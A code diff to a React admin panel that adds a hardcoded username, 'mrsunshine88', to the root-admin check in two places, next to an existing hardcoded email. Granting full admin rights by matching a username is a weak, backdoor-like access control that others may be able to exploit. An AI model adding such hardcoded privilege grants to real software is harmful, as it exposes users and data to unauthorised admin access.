@@ -96,7 +96,7 @@ export default function AdminPanel() {
 
   useEffect(() => {
     if (!userProfile) return;
-    const isRoot = userProfile.auth_email === 'apersson508@gmail.com' || userProfile.perm_roles === true;
+    const isRoot = userProfile.auth_email === 'apersson508@gmail.com' || userProfile.perm_roles === true || userProfile.username === 'mrsunshine88';
     const canManageSupport = isRoot || userProfile.perm_support === true;
 
     if (canManageSupport) {
@@ -153,7 +153,7 @@ export default function AdminPanel() {
 
   if (!userProfile) return <AdminSkeleton />;
 
-  const isRoot = userProfile.auth_email === 'apersson508@gmail.com' || userProfile.perm_roles === true;
+  const isRoot = userProfile.auth_email === 'apersson508@gmail.com' || userProfile.perm_roles === true || userProfile.username === 'mrsunshine88';
   const canManageUsers = isRoot || userProfile.perm_users === true;
   const canManageContent = isRoot || userProfile.perm_content === true;
   const canManageRooms = isRoot || userProfile.perm_rooms === true;
